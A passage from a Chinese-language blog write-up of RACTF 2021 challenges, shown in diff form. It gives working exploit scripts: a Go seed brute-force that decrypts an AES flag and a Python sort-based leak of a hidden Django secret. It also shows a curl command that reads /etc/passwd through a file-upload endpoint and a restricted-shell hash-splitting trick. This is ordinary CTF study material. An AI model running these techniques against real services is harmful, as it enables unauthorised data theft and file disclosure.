+		<span style=color:#75af00>flag</span> <span style=color:#111>=</span> <span style=color:#75af00>encrypt</span><span style=color:#111>(</span><span style=color:#75af00>rawFlag</span><span style=color:#111>,</span> <span style=color:#75af00>key</span><span style=color:#111>,</span> <span style=color:#75af00>iv</span><span style=color:#111>,</span> <span style=color:#75af00>aes</span><span style=color:#111>.</span><span style=color:#75af00>BlockSize</span><span style=color:#111>)</span>
+		<span style=color:#75af00>flagmu</span><span style=color:#111>.</span><span style=color:#75af00>Unlock</span><span style=color:#111>()</span>
+	<span style=color:#111>}</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>handler</span><span style=color:#111>(</span><span style=color:#75af00>w</span> <span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ResponseWriter</span><span style=color:#111>,</span> <span style=color:#75af00>req</span> <span style=color:#f92672>*</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>Request</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>flagmu</span><span style=color:#111>.</span><span style=color:#75af00>Lock</span><span style=color:#111>()</span>
+	<span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Fprint</span><span style=color:#111>(</span><span style=color:#75af00>w</span><span style=color:#111>,</span> <span style=color:#75af00>flag</span><span style=color:#111>)</span>
+	<span style=color:#75af00>flagmu</span><span style=color:#111>.</span><span style=color:#75af00>Unlock</span><span style=color:#111>()</span>
+<span style=color:#111>}</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>main</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Println</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Challenge starting up&#34;</span><span style=color:#111>)</span>
+	<span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>HandleFunc</span><span style=color:#111>(</span><span style=color:#d88200>&#34;/&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>handler</span><span style=color:#111>)</span>
+
+	<span style=color:#00a8c8>go</span> <span style=color:#75af00>changer</span><span style=color:#111>()</span>
+
+	<span style=color:#75af00>log</span><span style=color:#111>.</span><span style=color:#75af00>Fatal</span><span style=color:#111>(</span><span style=color:#75af00>http</span><span style=color:#111>.</span><span style=color:#75af00>ListenAndServe</span><span style=color:#111>(</span><span style=color:#d88200>&#34;:80&#34;</span><span style=color:#111>,</span> <span style=color:#00a8c8>nil</span><span style=color:#111>))</span>
+<span style=color:#111>}</span>
+</code></pre></div><p>可以看到flag被AES CBC加密，加密本身没问题，问题出在种子上；种子生成是靠<code>rand.Seed(time.Now().UnixNano() & ^0x7FFFFFFFFEFFF000)</code>完成，这样得到的种子很小 可以被我们爆破出来</p>
+<p>exp.go</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-go data-lang=go><span style=color:#f92672>package</span> <span style=color:#75af00>main</span>
+
+<span style=color:#f92672>import</span><span style=color:#111>(</span>
+	<span style=color:#d88200>&#34;math/rand&#34;</span>
+	<span style=color:#d88200>&#34;crypto/aes&#34;</span>
+	<span style=color:#d88200>&#34;crypto/cipher&#34;</span>
+	<span style=color:#d88200>&#34;encoding/hex&#34;</span>
+	<span style=color:#d88200>&#34;fmt&#34;</span>
+	<span style=color:#d88200>&#34;strings&#34;</span>
+<span style=color:#111>)</span>
+
+<span style=color:#00a8c8>func</span> <span style=color:#75af00>main</span><span style=color:#111>()</span> <span style=color:#111>{</span>
+	<span style=color:#75af00>hextext</span> <span style=color:#f92672>:=</span> <span style=color:#d88200>&#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914&#34;</span> <span style=color:#75715e>// Encrypted Flag
+</span><span style=color:#75715e></span>	<span style=color:#00a8c8>for</span> <span style=color:#75af00>seed</span><span style=color:#f92672>:=</span><span style=color:#ae81ff>1</span><span style=color:#111>;</span> <span style=color:#75af00>seed</span><span style=color:#f92672>&lt;=</span><span style=color:#ae81ff>19777868</span><span style=color:#111>;</span> <span style=color:#75af00>seed</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+		<span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Seed</span><span style=color:#111>(</span><span style=color:#111>int64</span><span style=color:#111>(</span><span style=color:#75af00>seed</span><span style=color:#111>))</span>
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>);</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Seed</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Int63</span><span style=color:#111>())</span>
+		<span style=color:#111>}</span>
+
+		<span style=color:#00a8c8>var</span> <span style=color:#75af00>key</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span>
+		<span style=color:#00a8c8>var</span> <span style=color:#75af00>iv</span> <span style=color:#111>[]</span><span style=color:#00a8c8>byte</span>
+
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#ae81ff>32</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>key</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>key</span><span style=color:#111>,</span> <span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>255</span><span style=color:#111>)))</span>
+		<span style=color:#111>}</span>
+
+		<span style=color:#00a8c8>for</span> <span style=color:#75af00>i</span> <span style=color:#f92672>:=</span> <span style=color:#ae81ff>0</span><span style=color:#111>;</span> <span style=color:#75af00>i</span> <span style=color:#111>&lt;</span> <span style=color:#75af00>aes</span><span style=color:#111>.</span><span style=color:#75af00>BlockSize</span><span style=color:#111>;</span> <span style=color:#75af00>i</span><span style=color:#f92672>++</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>iv</span> <span style=color:#111>=</span> <span style=color:#111>append</span><span style=color:#111>(</span><span style=color:#75af00>iv</span><span style=color:#111>,</span> <span style=color:#111>byte</span><span style=color:#111>(</span><span style=color:#75af00>rand</span><span style=color:#111>.</span><span style=color:#75af00>Intn</span><span style=color:#111>(</span><span style=color:#ae81ff>255</span><span style=color:#111>)))</span>
+		<span style=color:#111>}</span>
+		<span style=color:#75af00>block</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>aes</span><span style=color:#111>.</span><span style=color:#75af00>NewCipher</span><span style=color:#111>(</span><span style=color:#75af00>key</span><span style=color:#111>)</span>
+		<span style=color:#75af00>mode</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>cipher</span><span style=color:#111>.</span><span style=color:#75af00>NewCBCDecrypter</span><span style=color:#111>(</span><span style=color:#75af00>block</span><span style=color:#111>,</span> <span style=color:#75af00>iv</span><span style=color:#111>)</span>
+		<span style=color:#75af00>ciphertext</span><span style=color:#111>,</span> <span style=color:#75af00>_</span> <span style=color:#f92672>:=</span> <span style=color:#75af00>hex</span><span style=color:#111>.</span><span style=color:#75af00>DecodeString</span><span style=color:#111>(</span><span style=color:#75af00>hextext</span><span style=color:#111>)</span>
+
+		<span style=color:#75af00>flagBytes</span> <span style=color:#f92672>:=</span> <span style=color:#111>make</span><span style=color:#111>([]</span><span style=color:#00a8c8>byte</span><span style=color:#111>,</span> <span style=color:#111>len</span><span style=color:#111>(</span><span style=color:#75af00>ciphertext</span><span style=color:#111>))</span>
+		<span style=color:#75af00>mode</span><span style=color:#111>.</span><span style=color:#75af00>CryptBlocks</span><span style=color:#111>(</span><span style=color:#75af00>flagBytes</span><span style=color:#111>,</span> <span style=color:#75af00>ciphertext</span><span style=color:#111>)</span>
+
+		<span style=color:#75af00>flag</span> <span style=color:#f92672>:=</span> <span style=color:#111>string</span><span style=color:#111>(</span><span style=color:#75af00>flagBytes</span><span style=color:#111>)</span>
+		<span style=color:#00a8c8>if</span> <span style=color:#75af00>strings</span><span style=color:#111>.</span><span style=color:#75af00>Contains</span><span style=color:#111>(</span><span style=color:#75af00>flag</span><span style=color:#111>,</span> <span style=color:#d88200>&#34;ractf&#34;</span><span style=color:#111>)</span> <span style=color:#111>{</span>
+			<span style=color:#75af00>fmt</span><span style=color:#111>.</span><span style=color:#75af00>Printf</span><span style=color:#111>(</span><span style=color:#d88200>&#34;Flag: %s\n&#34;</span><span style=color:#111>,</span> <span style=color:#75af00>flag</span><span style=color:#111>)</span>
+			<span style=color:#00a8c8>break</span>
+		<span style=color:#111>}</span>
+	<span style=color:#111>}</span>
+<span style=color:#111>}</span>
+</code></pre></div><p><code>ractf{int3rEst1ng_M4sk_paTt3rn}</code></p>
+<p>参考：<a href=https://ctf.rip/write-ups/crypto/ractf-2021-military-grade/>wp</a></p>
+<h2 id=websecret-store>Web/Secret Store</h2>
+<blockquote>
+<p>How many secrets could a secret store store if a store could store secrets?</p>
+</blockquote>
+<p>注册和登录之后可以通过api设置一个自己的secret，设置好之后还可以更改</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818040636796.png alt=image-20210818040636796></p>
+<p>给出了源码，是django框架，用到了rest_framework，页面的debug模式还开着，有一个名为secret的app</p>
+<p>models.py规定了数据库的存储</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133525714.png alt=image-20210818133525714></p>
+<p>还有个配套的model serializer，规定了只读和只写的不同内容</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818133658766.png alt=image-20210818133658766></p>
+<p>然后是views.py，当确认user登录状态之后，如果设置过secret将会展示出来</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818134115205.png alt=image-20210818134115205></p>
+<p>直接用Get方式请求<code>/api/secret/?format=json</code>可以得到所有设置过的secret，理所当然的猜测id=1,owner=1的value=flag，但是value字段是只写而非只读的</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818151539994.png alt=image-20210818151539994></p>
+<p>由于用的是django的rest framework，可以利用它的<a href=https://www.django-rest-framework.org/api-guide/filtering/#orderingfilter>Ordering Filter</a>功能来对这些json内容根据value来进行一个排序<code>/api/secret/?ordering=value&format=json</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818152408227.png alt=image-20210818152408227></p>
+<p>采用char-by-char的盲注方式，不断地重复设置secret->以value排序->如果位于id=1,owner=1的前面，并且下一次就位于它的后面，说明这是正确的字符->修改secret，继续爆破下一个字符</p>
+<p>exp.py</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=color:#f92672>import</span> <span style=color:#111>requests</span>
+<span style=color:#f92672>import</span> <span style=color:#111>json</span>
+
+<span style=color:#111>flag</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;ractf&#34;</span>
+
+<span style=color:#111>csrf_token</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;XI7ZT6jdFeTvlywSDvRQT2xFlIAF2BRIF7ndzDOZqWPwZsIRdkbmgFSIpV8m9NIu&#34;</span>
+<span style=color:#111>session_id</span> <span style=color:#f92672>=</span> <span style=color:#d88200>&#34;hkdm1dclym6oycoe8pcmyvlh5d87qfvq&#34;</span>
+
+<span style=color:#111>headers</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+    <span style=color:#d88200>&#34;Cookie&#34;</span><span style=color:#111>:</span> <span style=color:#d88200>f</span><span style=color:#d88200>&#34;csrftoken=</span><span style=color:#d88200>{</span><span style=color:#111>csrf_token</span><span style=color:#d88200>}</span><span style=color:#d88200>; sessionid=</span><span style=color:#d88200>{</span><span style=color:#111>session_id</span><span style=color:#d88200>}</span><span style=color:#d88200>&#34;</span><span style=color:#111>,</span>
+    <span style=color:#d88200>&#34;X-CSRFToken&#34;</span><span style=color:#111>:</span> <span style=color:#111>csrf_token</span>
+<span style=color:#111>}</span>
+<span style=color:#111>our_secret_id</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>14</span>
+
+
+<span style=color:#00a8c8>def</span> <span style=color:#75af00>update_secret</span><span style=color:#111>(</span><span style=color:#111>curr_flag</span><span style=color:#111>):</span>
+    <span style=color:#111>found_real_char</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>False</span>
+    <span style=color:#00a8c8>for</span> <span style=color:#111>i</span> <span style=color:#f92672>in</span> <span style=color:#111>range</span><span style=color:#111>(</span><span style=color:#ae81ff>32</span><span style=color:#111>,</span> <span style=color:#ae81ff>127</span><span style=color:#111>):</span>
+        <span style=color:#111>payload</span> <span style=color:#f92672>=</span> <span style=color:#111>curr_flag</span> <span style=color:#f92672>+</span> <span style=color:#111>chr</span><span style=color:#111>(</span><span style=color:#111>i</span><span style=color:#111>)</span>
+        <span style=color:#111>json_payload</span> <span style=color:#f92672>=</span> <span style=color:#111>{</span>
+            <span style=color:#d88200>&#34;value&#34;</span><span style=color:#111>:</span> <span style=color:#111>payload</span>
+        <span style=color:#111>}</span>
+        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>post</span><span style=color:#111>(</span><span style=color:#d88200>&#34;http://193.57.159.27:21627/api/secret/&#34;</span><span style=color:#111>,</span>
+                          <span style=color:#111>data</span><span style=color:#f92672>=</span><span style=color:#111>json_payload</span><span style=color:#111>,</span> <span style=color:#111>headers</span><span style=color:#f92672>=</span><span style=color:#111>headers</span><span style=color:#111>)</span>
+        <span style=color:#75715e># print(r.status_code)</span>
+        <span style=color:#111>r</span> <span style=color:#f92672>=</span> <span style=color:#111>requests</span><span style=color:#f92672>.</span><span style=color:#111>get</span><span style=color:#111>(</span>
+            <span style=color:#d88200>&#34;http://193.57.159.27:21627/api/secret/?ordering=value&amp;format=json&#34;</span><span style=color:#111>,</span> <span style=color:#111>headers</span><span style=color:#f92672>=</span><span style=color:#111>headers</span><span style=color:#111>)</span>
+        <span style=color:#111>secrets</span> <span style=color:#f92672>=</span> <span style=color:#111>json</span><span style=color:#f92672>.</span><span style=color:#111>loads</span><span style=color:#111>(</span><span style=color:#111>r</span><span style=color:#f92672>.</span><span style=color:#111>text</span><span style=color:#111>)</span>
+        <span style=color:#00a8c8>for</span> <span style=color:#111>secret</span> <span style=color:#f92672>in</span> <span style=color:#111>secrets</span><span style=color:#111>:</span>
+            <span style=color:#00a8c8>if</span> <span style=color:#111>secret</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>1</span><span style=color:#111>:</span>
+                <span style=color:#111>found_real_char</span> <span style=color:#f92672>=</span> <span style=color:#00a8c8>True</span>
+            <span style=color:#00a8c8>if</span> <span style=color:#111>secret</span><span style=color:#111>[</span><span style=color:#d88200>&#39;id&#39;</span><span style=color:#111>]</span> <span style=color:#f92672>==</span> <span style=color:#111>our_secret_id</span><span style=color:#111>:</span>
+                <span style=color:#00a8c8>if</span> <span style=color:#111>found_real_char</span><span style=color:#111>:</span>
+                    <span style=color:#00a8c8>return</span> <span style=color:#111>chr</span><span style=color:#111>(</span><span style=color:#111>i</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#111>)</span>
+                <span style=color:#00a8c8>else</span><span style=color:#111>:</span>
+                    <span style=color:#00a8c8>break</span>
+    <span style=color:#00a8c8>return</span> <span style=color:#111>chr</span><span style=color:#111>(</span><span style=color:#111>i</span> <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span><span style=color:#111>)</span>
+
+
+<span style=color:#00a8c8>while</span> <span style=color:#00a8c8>True</span><span style=color:#111>:</span>
+    <span style=color:#111>next_char</span> <span style=color:#f92672>=</span> <span style=color:#111>update_secret</span><span style=color:#111>(</span><span style=color:#111>flag</span><span style=color:#111>)</span>
+    <span style=color:#111>flag</span> <span style=color:#f92672>+=</span> <span style=color:#111>next_char</span>
+    <span style=color:#111>print</span><span style=color:#111>(</span><span style=color:#d88200>&#39;[+] Curr Flag:&#39;</span><span style=color:#111>,</span> <span style=color:#111>flag</span><span style=color:#111>)</span>
+</code></pre></div><p><code>ractf{data_exf1l_via_s0rt1ng_0c66de47}</code></p>
+<p>参考：<a href=https://github.com/glikogataki/RACTF-Some-Challs/tree/main/secret_store>wp1</a> <a href=https://medium.com/@Nicholaz99/ractf-2021-writeup-647554511dc5>wp2</a></p>
+<h2 id=webim-a-fun>Web/I&rsquo;m a fun</h2>
+<blockquote>
+<p>Agent,</p>
+<p>Do you remember the firearms store case from last year? The one they were using as a secret communication platform?</p>
+<p>Well, we&rsquo;ve located the servers for them, the issue is they&rsquo;re based abroad in a country where we do not have any jurisdiction. Thus, we&rsquo;ll need to gain shell access to their systems the good old way. They&rsquo;re hosting another webapp again, this time it seems like some early version of a social media network that they&rsquo;re working on. This is good for us as it means there will almost certainly be some vulnerabilities present.</p>
+<p>We&rsquo;ve linked the webapp for you, can you take a look and see if you can gain access to their server?</p>
+</blockquote>
+<p>在/upload/content处可以上传video，特别的是上传处有个<code>external</code></p>
+<p>用curl方式请求一下/etc/passwd，<code>curl -X POST http://193.57.159.27:26635/upload/content -F file=/etc/passwd -F source=internal</code></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818163712187.png alt=image-20210818163712187></p>
+<p>之后尝试读源码（我没爆出来目录），之后的看wp了，我太菜</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818170117432.png alt=image-20210818170117432></p>
+<p>参考：<a href=https://github.com/TheBadGod/ractf2021/blob/main/im_a_fan.md>wp</a></p>
+<h2 id=osinttriangles>OSINT/Triangles</h2>
+<p><a href="https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW">https://www.google.com.hk/maps/place/Palazzo+Cosentini/@36.9267665,14.7344974,17z/data=!3m1!4b1!4m5!3m4!1s0x1311999df7357997:0x700f5a852df15e3!8m2!3d36.9267676!4d14.7366924?hl=zh-TW</a></p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210815120938702.png alt=image-20210815120938702></p>
+<h2 id=miscellaneousdiscord>Miscellaneous/Discord</h2>
+<blockquote>
+<p>Come join our <a href=https://discord.gg/Rrhdvzn>Discord</a>!</p>
+</blockquote>
+<p><code>ractf{so_here_we_are_again}</code></p>
+<h2 id=miscellaneousmissing-tools>Miscellaneous/Missing Tools</h2>
+<blockquote>
+<p>Man, my friend broke his linux install pretty darn bad. He can only use like, 4 commands. Can you take a look and see if you can recover at least some of his data?</p>
+<p>Username: <code>ractf</code></p>
+<p>Password: <code>8POlNixzDSThy</code></p>
+<p>Note: it may take a minute or more for your container to start depending on load</p>
+</blockquote>
+<p>根据给出的信息ssh连入一个终端，可以发现很多的命令都被禁止了</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025059013.png alt=image-20210818025059013></p>
+<p>使用<code>echo /usr/bin/* /bin/*</code>可以查看能使用的命令还有哪些</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818025158619.png alt=image-20210818025158619></p>
+<p>————先说一下简单的非预期解：<code>echo *</code>找到flag.txt，然后<code>source flag.txt</code>或者<code>sh &lt; flag.txt</code>都能读出来</p>
+<p>而预期解使用的是<u>split+re-sha256</u>的方式。直接用sha256sum得到flag然后想强行暴力破解显然非常的不现实，但是split这个工具可以以固定的字节数来划分给定的文件，如果我们以很小的标尺来划分flag并进行sha256，那么这样得到的hash值就将非常有可能爆破出来，最后再把它们合起来就能得到最终的flag了（这里用3bytes划分）</p>
+<div class=highlight><pre tabindex=0 style=color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash>$ split -b <span style=color:#ae81ff>3</span> flag.txt
+$ <span style=color:#111>echo</span> *
+flag.txt xaa xab xac xad xae xaf xag xah xai xaj xak xal
+$ sha256sum xa*
+df10b4bd068175bd33f200e48e721a019091c67c06c26ae273da5aaf51424618  xaa
+582c3f2f5c5c630d0ee458d5d7c859e7ed36d6fb5862a761e110562438bd4272  xab
+a7f5397443359ea76c50be82c77f1f893a060925b51a332cc5da906f83d3344e  xac
+569a659ae7633e5ddd7f523b283c1169dad3eb99a3da4b3ad2d5619d9236dc12  xad
+7096489b19f4ab1b6c9e1502367c18d5e3adcfeb21b0a0282041ca99e798a14d  xae
+618630d1fed7f03ed43dfb03eeae681c1812177c43d3afe1cbe32bb3fee12bf9  xaf
+f2f9ca19dad6782e5e92edd758439f11067ae23ab0d418a56f406de6c9bb151a  xag
+f481b98f744da847f44f5e67996010859061dca4945e87396016a1ef4ac38460  xah
+de7bc3aee118c9689e2cba40c4c427ab8986b8a37c9c4f837e019559de9faffd  xai
+a14d511b5d8b444da7ea5ab52feb71271a46bb8374ab24f5251701b23bef4276  xaj
+56fb98daea7879c3e2218eb960b9150c2d7978686af5f7f43f80641a6f62b22a  xak
+df8238034568781a5df3098ed46435fee0df6c807938e7dbeccb0a29f887d246  xal
+</code></pre></div><p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030044169.png alt=image-20210818030044169></p>
+<p>到<a href=https://crackstation.net/>CrackStation</a>一把梭</p>
+<p><img src=https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210818030225147.png alt=image-20210818030225147></p>
+<p><code>ractf{std0ut_1s_0v3rr4ted_spl1t_sha}</code></p>
+<hr>
+<p>害，前几天状态莫名很差，之前报的几个周末的ctf甚至连签到都没签，复现也是一拖再拖，拖到环境都关完了，挺后悔的，是自己的问题。</p>
+<p>在反思和调整了，嗯。</p>
+</div>
+</section>
+</article>
+</main>
+<div class="w-full h-0 flex-none order-3"></div>
+<aside role=contentinfo class="w-full md:w-2/5 xl:w-1/2 md:pr-12 lg:pr-20 xl:pr-24 order-4 md:order-3 md:sticky md:bottom-0 self-end max-w-2xl">
+<div class="md:float-right md:text-right leading-loose tracking-tight md:mb-2">
+<div class="md:max-w-xs flex flex-col md:items-end">
+<ul class="font-serif flex-grow-0 flex justify-between flex-wrap md:flex-col">
+<li class="px-1 md:px-0">
+<a href=/posts/ title="Posts page">
+Posts
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/categories/ title="Categories page">
+Categories
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/tags/ title="Tags page">
+Tags
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/series/ title="Series page">
+Series
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/about/ title="About page">
+About
+</a>
+</li>
+<li class="px-1 md:px-0">
+<a href=/friends/ title="Friends page">
+Friends
+</a>
+</li>
+<div id=fastSearch class=m-0>
+<input id=searchInput type=text size=10 class="bg-gray-100 focus:outline-none border-b border-gray-100 focus:border-eucalyptus-300 md:text-right
+placeholder-java-500 min-w-0 max-w-xxxs" placeholder=search>
+<ul id=searchResults class="bg-gray-200 px-2 divide-y divide-gray-400">
+</ul>
+</div>
+</ul>
+<div class="flex flex-wrap-reverse md:justify-end content-end md:content-start justify-start items-start max-h-16">
+<a href=https://github.com/AmiaaaZ target=_blank class="github icon pl-1 text-eucalyptus-400 hover:text-java-400" title="github link" rel=noopener aria-label="follow on github——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path fill-rule="nonzero" d="M5.883 18.653c-.3-.2-.558-.455-.86-.816a50.32 50.32.0 01-.466-.579c-.463-.575-.755-.84-1.057-.949a1 1 0 01.676-1.883c.752.27 1.261.735 1.947 1.588-.094-.117.34.427.433.539.19.227.33.365.44.438.204.137.587.196 1.15.14.023-.382.094-.753.202-1.095C5.38 15.31 3.7 13.396 3.7 9.64c0-1.24.37-2.356 1.058-3.292-.218-.894-.185-1.975.302-3.192a1 1 0 01.63-.582c.081-.024.127-.035.208-.047.803-.123 1.937.17 3.415 1.096A11.731 11.731.0 0112 3.315c.912.0 1.818.104 2.684.308 1.477-.933 2.613-1.226 3.422-1.096.085.013.157.03.218.05a1 1 0 01.616.58c.487 1.216.52 2.297.302 3.19.691.936 1.058 2.045 1.058 3.293.0 3.757-1.674 5.665-4.642 6.392.125.415.19.879.19 1.38a300.492 300.492.0 01-.012 2.716 1 1 0 01-.019 1.958c-1.139.228-1.983-.532-1.983-1.525l.002-.446.005-.705c.005-.708.007-1.338.007-1.998.0-.697-.183-1.152-.425-1.36-.661-.57-.326-1.655.54-1.752 2.967-.333 4.337-1.482 4.337-4.66.0-.955-.312-1.744-.913-2.404a1 1 0 01-.19-1.045c.166-.414.237-.957.096-1.614l-.01.003c-.491.139-1.11.44-1.858.949a1 1 0 01-.833.135A9.626 9.626.0 0012 5.315c-.89.0-1.772.119-2.592.35a1 1 0 01-.83-.134c-.752-.507-1.374-.807-1.868-.947-.144.653-.073 1.194.092 1.607a1 1 0 01-.189 1.045C6.016 7.89 5.7 8.694 5.7 9.64c0 3.172 1.371 4.328 4.322 4.66.865.097 1.201 1.177.544 1.748-.192.168-.429.732-.429 1.364v3.15c0 .986-.835 1.725-1.96 1.528a1 1 0 01-.04-1.962v-.99c-.91.061-1.662-.088-2.254-.485z"/></g></svg>
+</div>
+</a>
+<a href=vickyckyky@foxmail.com target=_blank class="mail icon pl-1 text-eucalyptus-400 hover:text-java-400" title="mail link" rel=noopener aria-label="follow on mail——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M3 3h18a1 1 0 011 1v16a1 1 0 01-1 1H3a1 1 0 01-1-1V4a1 1 0 011-1zm17 4.238-7.928 7.1L4 7.216V19h16V7.238zM4.511 5l7.55 6.662L19.502 5H4.511z"/></g></svg>
+</div>
+</a>
+<a href=https://www.zhihu.com/people/lan-shan-86-69 target=_blank class="zhihu icon pl-1 text-eucalyptus-400 hover:text-java-400" title="zhihu link" rel=noopener aria-label="follow on zhihu——Opens in a new window">
+<div class="fill-current h-8 w-8"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><g><path fill="none" d="M0 0h24v24H0z"/><path d="M12.344 17.963l-1.688 1.074-2.131-3.35c-.44 1.402-1.172 2.665-2.139 3.825-.402.483-.82.918-1.301 1.375-.155.147-.775.717-.878.82l-1.414-1.414c.139-.139.787-.735.915-.856.43-.408.795-.79 1.142-1.206 1.266-1.518 2.03-3.21 2.137-5.231H3v-2h4V7h-.868c-.689 1.266-1.558 2.222-2.618 2.857L2.486 8.143c1.395-.838 2.425-2.604 3.038-5.36l1.952.434c-.14.633-.303 1.227-.489 1.783H11.5v2H9v4h2.5v2H9.185l3.159 4.963zm3.838-.07L17.298 17H19V7h-4v10h.736l.446.893zM13 5h8v14h-3l-2.5 2-1-2H13V5z"/></g></svg>
+</div>
+</a>
+</div>
+<div class="text-sm text-gray-500 leading-tight a-gray">
+<br>
+Built with Hugo and theme <a href=https://github.com/heyeshuang/hugo-theme-tokiwa>Tokiwa</a>. 2950 words in this page.
+</div>
+</div>
+</div>
+</aside>
+<footer class="w-full md:w-3/5 xl:w-1/2 order-3 max-w-3xl md:order-4 pt-2">
+<hr class=double-line>
+<div class="flex flex-wrap justify-between pb-2 leading-loose font-serif">
+<a class=flex-grow-0 href=/2021/08/12/python-unserialize-notes-01-python/><svg class="fill-current inline-block h-4 w-4" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" width="24" height="24"><path fill="none" d="M0 0h24v24H0z"/><path d="M7.828 11H20v2H7.828l5.364 5.364-1.414 1.414L4 12l7.778-7.778 1.414 1.414z"/></svg>
+反序列化专题笔记·壹·python篇
+</a>
+</div>
+<div>
+<div class="font-serif pb-2 flex align-start leading-loose">
+<span class="heading pr-6 leading-loose">Related</span>
+<span>
+<a href=/2021/08/08/redpwn2021-wp/>RedpwnCTF2021 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/08/05/dasctf0721-wp/>DasCTF0721 Wp</a>&nbsp;&nbsp;/&nbsp;
+<a href=/2021/07/29/cybricsctf2021-wp/>CybricsCTF2021 Wp</a>
+</span>
+</div>
+</div>
+<hr>
+<div class=pb-2>
+<div id=disqus_thread></div>
